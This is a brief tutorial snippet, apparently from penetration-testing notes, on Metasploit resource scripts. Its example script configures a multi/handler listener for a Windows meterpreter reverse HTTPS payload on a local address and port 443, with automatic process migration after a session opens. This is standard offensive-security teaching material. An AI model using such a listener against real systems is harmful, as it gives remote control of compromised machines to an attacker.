[Resource scripts](https://docs.rapid7.com/metasploit/resource-scripts/) can chain together a series of Metasploit console commands and Ruby code.

```bash
msf> makerc ~/Desktop/listener.rc # save commands to resource script


# Each time you run the resource script, these commands will be executed exactly the same each time.
$ cat listener.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
set AutoRunScript post/windows/manage/migrate 
set ExitOnSession false
run -z -j


# execute script outside or inside msf
$ sudo msfconsole -r listener.rc
msf> resource listener.rc
```
